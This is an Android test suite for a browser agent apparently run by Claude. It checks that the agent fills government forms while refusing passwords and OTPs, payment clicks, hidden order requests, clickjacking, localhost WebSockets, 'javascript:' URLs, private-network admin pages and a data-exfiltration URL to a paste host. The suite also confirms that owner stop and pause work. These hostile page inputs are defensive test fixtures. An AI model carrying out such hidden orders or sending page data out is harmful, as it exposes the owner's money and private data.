package com.ronin.browser.agent

import android.util.Log
import androidx.test.core.app.ActivityScenario
import androidx.test.ext.junit.runners.AndroidJUnit4
import org.json.JSONArray
import org.json.JSONObject
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith

/**
 * The pilot's per-mechanism checks on a REAL WebView (emulators in CI, then the owner's phone + tablet through the
 * laptop helper). Each test names the mechanism it proves: tap (dispatchTouchEvent), commit (InputConnection),
 * editorinfo (native password check), guard (shouldInterceptRequest / shouldOverrideUrlLoading), sw (service worker
 * hook), journal, owner. A failing mechanism must be switched off before the owner uses the agent.
 */
@RunWith(AndroidJUnit4::class)
class AgentDeviceTest {
    private lateinit var scenario: ActivityScenario<AgentActivity>
    private lateinit var d: AgentDriver
    private var n = 0
    private var snap = JSONObject()

    @Before fun start() {
        // never link to the owner's real relay from a test
        val i = android.content.Intent(androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().targetContext, AgentActivity::class.java).putExtra("noLink", true)
        scenario = ActivityScenario.launch(i)
        var w = 0
        while (AgentActivity.driver == null && w < 100) { Thread.sleep(100); w++ }
        d = AgentActivity.driver ?: error("agent did not start")
        d.testPages.clear(); d.testPages.putAll(AgentTestPages.all)
        d.resume(); d.checked()
    }

    @After fun stop() { scenario.close() }

    private fun tool(name: String, vararg kv: Pair<String, Any>): JSONObject {
        val a = JSONObject(); for ((k, v) in kv) a.put(k, v)
        val r = d.run("t${System.nanoTime()}-${n++}", name, a)
        Log.i("RoninAgent", "TEST $name -> ${r.toString().take(160)}")
        return r
    }

    private fun open(url: String): JSONObject { val r = tool("open", "url" to url); snap = tool("snapshot"); return r }

    private fun ref(re: String): String {
        val els: JSONArray = snap.optJSONArray("elements") ?: JSONArray()
        val rx = Regex(re)
        for (i in 0 until els.length()) { val l = els.getString(i); if (rx.containsMatchIn(l)) return Regex("\\[(e\\d+)]").find(l)!!.groupValues[1] }
        error("no element like /$re/ in ${els.toString().take(400)}")
    }

    private fun page(expr: String) = d.pageValue(expr)
    private fun mech(name: String, ok: Boolean) = Log.i("RoninAgent", "MECH $name ${if (ok) "PASS" else "FAIL"}")

    @Test fun epdsFormIsFilledWithRealTapsAndTyping() {
        open("https://epds.example.gov.in/")
        assertTrue("ID numbers hidden", snap.optString("page_text_untrusted").contains("[aadhaar-like hidden]"))
        val t = tool("type", "ref" to ref("Employee name"), "text" to "Ramesh Kumar")
        mech("commit:${t.optString("method")}", t.optString("check") == "verified")
        assertEquals("name typed and read back: $t", "verified", t.optString("check"))
        val h = tool("type", "ref" to ref("Employee ID"), "text" to "UP12345")
        assertEquals("$h", "verified", h.optString("check"))
        val hi = tool("type", "ref" to ref("Mobile"), "text" to "9876543210")
        assertEquals("$hi", "verified", hi.optString("check"))
        val s = tool("select", "ref" to ref("select"), "option" to "Assistant Teacher")
        assertTrue("$s", s.optString("done").contains("Assistant Teacher"))
        val c = tool("click", "ref" to ref("button \"Save\""))
        assertTrue("$c", c.has("done"))
        Thread.sleep(500)
        assertEquals("saved once", "1", page("window.saves"))
        mech("tap", page("window.saves") == "1")
        assertTrue(page("document.getElementById('ok').textContent")!!.contains("Ramesh Kumar / Assistant Teacher"))
    }

    @Test fun hindiNameIsTyped() {
        open("https://epds.example.gov.in/")
        val t = tool("type", "ref" to ref("Employee name"), "text" to "रमेश कुमार")
        mech("hindi:${t.optString("method")}", t.optString("check") == "verified")
        assertEquals("$t", "verified", t.optString("check"))
    }

    @Test fun passwordsOtpsAndPinsAreNeverTyped() {
        open("https://verify.example.in/")
        assertTrue(tool("type", "ref" to ref("Portal password"), "text" to "x").optString("error").contains("password"))
        assertTrue(tool("type", "ref" to ref("Enter code"), "text" to "123456").optString("error").contains("OTP"))
        assertTrue(tool("type", "ref" to ref("Digit 1"), "text" to "4").optString("error").contains("OTP"))
        assertTrue(tool("type", "ref" to ref("Remarks\""), "text" to "48 29-13").optString("error").contains("looks like an OTP"))
        val ok = tool("type", "ref" to ref("Remarks2"), "text" to "Checked on site")
        assertEquals("$ok", "verified", ok.optString("check"))
    }

    @Test fun nativePasswordCheckSeesThePasswordBox() {
        // the native check alone (outside the page's JavaScript): tap the password box and read what the engine told the keyboard
        open("https://verify.example.in/")
        val before = d.web.lastInputAt
        tool("click", "ref" to ref("Portal password"))
        var w = 0; while (d.web.lastInputAt <= before && w < 30) { Thread.sleep(100); w++ }
        val seen = d.web.lastInputAt > before
        val secret = seen && AgentRules.secretInputType(d.web.lastInputType)
        mech("editorinfo", secret)
        Log.i("RoninAgent", "MECH editorinfo-seen $seen type=${d.web.lastInputType}")
        assertTrue("EditorInfo arrived after the tap", seen)
        assertTrue("EditorInfo says password (type ${d.web.lastInputType})", secret)
    }

    @Test fun moneyPagesAndHiddenOrdersAreStopped() {
        open("https://fees.example.in/")
        assertTrue(tool("click", "ref" to ref("भुगतान")).optString("error").contains("money"))
        open("https://shop.example.com/")
        assertTrue("clickjacking", tool("click", "ref" to ref("Cancel order")).optString("error").contains("covers"))
        open("https://renew.example.com/")
        val c = tool("click", "ref" to ref("Continue"))
        Thread.sleep(800)
        mech("guard-fetch", c.optString("error").contains("BLOCKED") && page("window.paid") != "1")
        assertTrue("hidden fetch POST placeOrder blocked: $c", c.optString("error").contains("BLOCKED"))
        assertTrue(page("window.paid") != "1")
        val b0 = d.blocked.size
        tool("click", "ref" to ref("Later"))
        Thread.sleep(3800)
        mech("guard-timer", d.blocked.size > b0 && page("window.paid2") != "1")
        assertTrue("an order 3 s after the tap is blocked too", d.blocked.size > b0 && page("window.paid2") != "1")
        open("https://renew.example.com/")
        val l = tool("click", "ref" to ref("Next step"))
        mech("guard-navigation", l.optString("error").contains("BLOCKED"))
        assertTrue("/order?confirm=1 link: $l", l.optString("error").contains("BLOCKED"))
        open("https://renew.example.com/")
        tool("click", "ref" to ref("Save note")); Thread.sleep(800)
        assertEquals("an ordinary POST still works", "1", page("window.noted"))
    }

    @Test fun serviceWorkerOrderIsBlocked() {
        open("https://worker.example.com/")
        val b0 = d.blocked.size
        tool("click", "ref" to ref("Start worker"))
        Thread.sleep(4000)
        val ok = d.blocked.drop(b0).any { it.contains("placeOrder") }
        Log.i("RoninAgent", "MECH sw-registered ${page("window.swok")} err=${page("window.swerr")}")
        mech("sw", ok || page("window.swok") != "1")
        if (page("window.swok") == "1") assertTrue("a worker's POST placeOrder is blocked", ok)
    }

    @Test fun brokerIsReadOnlyAndOnlyListedPagesOpen() {
        open("https://web.dhan.co/")
        assertTrue(tool("type", "ref" to ref("Mobile"), "text" to "1100").optString("error").contains("READ-ONLY"))
        assertTrue(tool("click", "ref" to ref("Login")).optString("error").contains("READ-ONLY"))
        assertTrue(tool("open", "url" to "https://web.dhan.co/order").optString("error").contains("read pages"))
        d.readPages["web.dhan.co"] = mutableSetOf("/positions")
        open("https://web.dhan.co/positions")
        assertTrue(snap.optString("page_text_untrusted").contains("P&L +1,240"))
        assertTrue(tool("click", "ref" to ref("Exit All")).optString("error").contains("READ-ONLY"))
    }

    @Test fun webSocketToThisDeviceIsRefusedByTheProxy() {
        open("https://news.example.com/")
        val p = AgentActivity.proxy
        if (p == null || !AgentActivity.proxyOn) { mech("proxy", false); Log.i("RoninAgent", "MECH proxy-not-supported"); return }
        val b0 = p.refused.get()
        page("(function(){try{new WebSocket('wss://127.0.0.1:8443/x')}catch(e){};try{new WebSocket('wss://localhost:8443/y')}catch(e){};return 1})()")
        Thread.sleep(3000)
        mech("proxy", p.refused.get() > b0)
        assertTrue("a page's WebSocket to this device is refused by Ronin's proxy", p.refused.get() > b0)
    }

    // the owner said (28 Nov) "no button does anything": every press must visibly change the banner at once
    @Test fun everyBannerButtonVisiblyAnswers() {
        fun press(tag: String): String {
            var text = ""
            scenario.onActivity { a ->
                val root = a.window.decorView
                (root.findViewWithTag<android.widget.Button>(tag) ?: error("no button $tag")).performClick()
            }
            Thread.sleep(300)
            scenario.onActivity { a -> text = ((a.window.decorView.findViewWithTag<android.view.View>("agent-toggle").parent as android.view.ViewGroup).getChildAt(0) as android.widget.TextView).text.toString() }
            return text
        }
        press("agent-toggle") // the buttons are folded away by default (full-screen page)
        assertTrue(press("agent-stop").contains("रुका"))
        assertTrue(d.stopped)
        assertTrue(press("agent-resume").contains("काम कर सकता"))
        assertTrue(!d.stopped)
        assertTrue(press("agent-pause").contains("रुका"))
        assertTrue(d.paused)
        press("agent-resume"); assertTrue(!d.paused)
        press("agent-connect") // no link in tests: must not crash, says so
        mech("banner", true)
    }

    // owner, 28 Nov: "the top bar is not separate, the page and the bar behind it are mixed" (Android 15+ draws apps
    // under the status bar): the strip must start below the status bar and the page above the navigation bar
    @Test fun bannerStartsBelowTheStatusBar() {
        var top = -1; var inset = -1; var bottomGap = -1; var navInset = -1
        scenario.onActivity { a ->
            val web = findWeb(a.window.decorView)!!
            val ins = androidx.core.view.ViewCompat.getRootWindowInsets(a.window.decorView)!!
            inset = ins.getInsets(androidx.core.view.WindowInsetsCompat.Type.statusBars()).top
            navInset = ins.getInsets(androidx.core.view.WindowInsetsCompat.Type.navigationBars()).bottom
            val loc = IntArray(2); web.getLocationOnScreen(loc); top = loc[1]
            bottomGap = a.window.decorView.height - (loc[1] + web.height)
        }
        Log.i("RoninAgent", "insets: page top $top, status bar $inset, nav $navInset, page bottom gap $bottomGap")
        assertTrue("the page starts below the status bar ($top < $inset)", top >= inset)
        assertTrue("the page ends above the navigation bar ($bottomGap < $navInset)", bottomGap >= navInset)
        mech("insets", true)
    }

    // owner, 28 Nov: "nobody should see whom I make work for me: keep the robot button, write C, and keep every
    // setting inside the button so the page is full screen"
    @Test fun pageIsFullScreenAndTheRobotOpensTheButtons() {
        var stripShown = true; var pageH = 0; var rootH = 0; var text = ""
        scenario.onActivity { a ->
            val strip = a.window.decorView.findViewWithTag<android.view.View>("agent-toggle").parent.parent as android.view.View
            stripShown = strip.visibility == android.view.View.VISIBLE
            val web = findWeb(a.window.decorView)!!; pageH = web.height; rootH = (web.parent.parent as android.view.View).let { it.height - it.paddingTop - it.paddingBottom }
        }
        assertTrue("no strip over the page by default", !stripShown)
        assertEquals("the page has the whole screen", rootH, pageH)
        scenario.onActivity { a -> a.window.decorView.findViewWithTag<android.view.View>("agent-fab").performClick() }
        Thread.sleep(300)
        scenario.onActivity { a ->
            val t = a.window.decorView.findViewWithTag<android.view.View>("agent-toggle")
            stripShown = (t.parent.parent as android.view.View).visibility == android.view.View.VISIBLE
            text = ((t.parent as android.view.ViewGroup).getChildAt(0) as android.widget.TextView).text.toString()
            fun all(v: android.view.View): List<String> = (if (v is android.widget.TextView) listOf(v.text.toString()) else emptyList()) +
                ((v as? android.view.ViewGroup)?.let { g -> (0 until g.childCount).flatMap { all(g.getChildAt(it)) } } ?: emptyList())
            text += " | " + all(a.window.decorView).joinToString(" | ")
        }
        assertTrue("the robot opens status and buttons", stripShown)
        assertTrue("the name is never written on the screen: $text", !text.contains("Claude"))
        mech("full-screen", true)
    }

    private fun findWeb(v: android.view.View): android.webkit.WebView? = v as? android.webkit.WebView
        ?: (v as? android.view.ViewGroup)?.let { g -> (0 until g.childCount).firstNotNullOfOrNull { findWeb(g.getChildAt(it)) } }

    @Test fun repairButtonAnswersWithoutALink() {
        scenario.onActivity { a -> a.window.decorView.findViewWithTag<android.widget.Button>("agent-toggle").performClick() }
        var text = ""
        scenario.onActivity { a -> a.window.decorView.findViewWithTag<android.widget.Button>("agent-repair").performClick() }
        Thread.sleep(300)
        scenario.onActivity { a -> text = ((a.window.decorView.findViewWithTag<android.view.View>("agent-toggle").parent as android.view.ViewGroup).getChildAt(0) as android.widget.TextView).text.toString() }
        assertTrue("says the link is missing: $text", text.contains("link"))
    }

    // EPDS, 28 Nov: "IFSC Search" (an ASP.NET postback link) must press, in front and in the background; other script
    // links stay refused
    @Test fun postbackLinkIsPressedInFrontAndBehind() {
        for (bg in listOf(false, true)) {
            d.forceBackground = bg
            try {
                open("https://ifsc.example.gov.in/")
                assertTrue(!tool("type", "ref" to ref("IFSC"), "text" to "SBIN0001234").has("error"))
                val r = tool("click", "ref" to ref("IFSC Search"))
                assertTrue("pressed (bg=$bg): $r", !r.has("error"))
                var w = 0; while (d.pageValue("window.posted") != "1" && w < 30) { Thread.sleep(100); w++ }
                assertEquals("the page's postback ran (bg=$bg)", "1", d.pageValue("window.posted"))
                assertEquals("the panel was filled (bg=$bg)", "\"SBI SULTANPUR\"", d.pageValue("document.getElementById('bank').value"))
                assertTrue(tool("click", "ref" to ref("Bad link")).optString("error").contains("script link"))
            } finally { d.forceBackground = false }
        }
        mech("postback", true)
    }

    // EPDS, 28 Nov: Ronin REALLY behind another app (not only told so): "IFSC Search" + its AJAX + timers must finish
    @Test fun ajaxFinishesWhileRoninIsReallyBehindAnotherApp() {
        open("https://ifsc.example.gov.in/")
        assertTrue(!tool("type", "ref" to ref("IFSC"), "text" to "SBIN0001234").has("error"))
        val ctx = androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().targetContext
        ctx.startActivity(android.content.Intent(android.provider.Settings.ACTION_SETTINGS).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
        var w = 0; while (!d.background() && w < 50) { Thread.sleep(100); w++ }
        assertTrue("Ronin is behind another app", d.background())
        Thread.sleep(1500)
        val r = tool("click", "ref" to ref("IFSC Search"))
        assertEquals("background-press", r.optString("method"))
        w = 0; while (d.pageValue("window.posted") != "1" && w < 100) { Thread.sleep(100); w++ }
        assertEquals("the AJAX finished behind another app", "\"SBI SULTANPUR\"", d.pageValue("document.getElementById('bank').value"))
        ctx.startActivity(android.content.Intent(ctx, AgentActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
        Thread.sleep(800)
        mech("background-ajax", true)
    }

    // screen OFF (phone locked): the page's timers keep their pace and the AJAX finishes
    @Test fun ajaxFinishesWithTheScreenOff() {
        open("https://ifsc.example.gov.in/")
        assertTrue(!tool("type", "ref" to ref("IFSC"), "text" to "SBIN0001234").has("error"))
        val ua = androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().uiAutomation
        d.pageValue("window.beats=0;setInterval(function(){window.beats++},1000)")
        ua.executeShellCommand("input keyevent KEYCODE_SLEEP").close()
        try {
            Thread.sleep(2000)
            val b0 = d.pageValue("window.beats")?.toIntOrNull() ?: -1
            Thread.sleep(10_000)
            val b1 = d.pageValue("window.beats")?.toIntOrNull() ?: -1
            Log.i("RoninAgent", "screen off: timer beats in 10 s = ${b1 - b0}")
            val r = tool("click", "ref" to ref("IFSC Search"))
            assertTrue("pressed with the screen off: $r", !r.has("error"))
            var w = 0; while (d.pageValue("window.posted") != "1" && w < 150) { Thread.sleep(100); w++ }
            assertEquals("the AJAX finished with the screen off", "\"SBI SULTANPUR\"", d.pageValue("document.getElementById('bank').value"))
            assertTrue("timers kept their pace with the screen off (${b1 - b0} beats in 10 s)", b1 - b0 >= 7)
        } finally { ua.executeShellCommand("input keyevent KEYCODE_WAKEUP").close(); Thread.sleep(800) }
        mech("screen-off", true)
    }

    // the owner works in the Claude app while Ronin runs behind it (28 Nov): typing and taps must still work
    @Test fun worksWhileTheOwnerIsInAnotherApp() {
        open("https://epds.example.gov.in/")
        d.forceBackground = true
        try {
            val r = tool("type", "ref" to ref("Employee name"), "text" to "सीता देवी")
            assertTrue(r.toString(), r.optString("check") == "verified" && r.optString("method") == "background-fill")
            val c = tool("click", "ref" to ref("Save"))
            assertTrue(c.toString(), c.optString("method") == "background-press")
            open("https://verify.example.in/")
            assertTrue("password box still refused", tool("type", "ref" to ref("Portal password"), "text" to "x").has("error"))
            mech("background", true)
        } finally { d.forceBackground = false }
    }

    @Test fun linksAddressesAndHumanChecks() {
        open("https://news.example.com/")
        assertTrue(tool("click", "ref" to ref("Read more")).optString("error").contains("script link"))
        assertTrue(tool("open", "url" to "http://192.168.1.1/admin").optString("error").contains("never opened"))
        assertTrue(tool("open", "url" to "javascript:alert(1)").optString("error").contains("not allowed"))
        open("https://protected.example.org/")
        assertTrue(tool("click", "ref" to ref("Verify you are human")).optString("error").contains("human check"))
        open("https://liar.example.com/")
        assertTrue("a page that lies to the helper still shows Pay now as money", snap.optJSONArray("elements").toString().contains("Pay now"))
    }

    @Test fun dataDoesNotLeaveAfterReadingSensitivePages() {
        open("https://bank.example.in/")
        assertTrue(snap.optString("page_text_untrusted").contains("[PAN hidden]"))
        val r = tool("open", "url" to "https://paste.example.net/?d=" + "A".repeat(60))
        assertTrue("$r", r.optString("error").contains("sensitive"))
        assertTrue(tool("screenshot").optString("error").contains("refused"))
    }

    // owner, 28 Nov: "a tap by mistake stops the work at once; it must go on until I press stop / pause myself"
    @Test fun ownerTouchDoesNotPauseOnlyPauseAndStopDo() {
        open("https://news.example.com/")
        scenario.onActivity { a ->
            fun find(v: android.view.View): android.webkit.WebView? = v as? android.webkit.WebView
                ?: (v as? android.view.ViewGroup)?.let { g -> (0 until g.childCount).firstNotNullOfOrNull { find(g.getChildAt(it)) } }
            val w = find(a.window.decorView)!!
            val t = android.os.SystemClock.uptimeMillis()
            listOf(android.view.MotionEvent.ACTION_DOWN, android.view.MotionEvent.ACTION_UP).forEach { act ->
                val e = android.view.MotionEvent.obtain(t, android.os.SystemClock.uptimeMillis(), act, 50f, 200f, 0)
                e.source = android.view.InputDevice.SOURCE_TOUCHSCREEN; w.dispatchTouchEvent(e); e.recycle()
            }
        }
        assertTrue("a touch must not pause", !d.paused)
        assertTrue("work goes on after the owner's tap", !tool("snapshot").has("error"))
        d.ownerPause()
        assertTrue(tool("snapshot").optString("error").contains("RESUME"))
        d.resume()
        assertTrue(!tool("snapshot").has("error"))
        d.ownerStop()
        assertTrue(tool("snapshot").optString("error").contains("STOP"))
        d.resume()
        mech("owner", true)
    }

    // STOP in the notification (from any app) stops Claude at once; the last step shows there
    @Test fun notificationStopStopsClaude() {
        val c = androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().targetContext
        val n = AgentKeepAlive.note(c, "आख़िरी काम: typed into \"क्रम\"")
        assertEquals(2, n.actions.size)
        assertEquals("STOP", n.actions[0].title.toString())
        c.startService(android.content.Intent(c, AgentKeepAlive::class.java).setAction("stop"))
        var w = 0; while (!d.stopped && w < 50) { Thread.sleep(100); w++ }
        assertTrue("STOP in the notification stopped Claude", d.stopped)
        assertTrue(tool("snapshot").optString("error").contains("STOP"))
        d.resume()
        mech("notification-stop", true)
    }

    @Test fun interruptedSaveIsNeverPressedAgain() {
        open("https://epds.example.gov.in/")
        val prefs = androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().targetContext.getSharedPreferences("agent-journal", 0)
        prefs.edit().putString("j_crash1", "started").putString("lastTarget", "click|epds.example.gov.in|button|Save||").commit()
        val r = d.run("crash1", "click", JSONObject().put("ref", ref("button \"Save\"")))
        assertTrue("$r", r.has("uncertain"))
        mech("journal", r.has("uncertain"))
    }
}
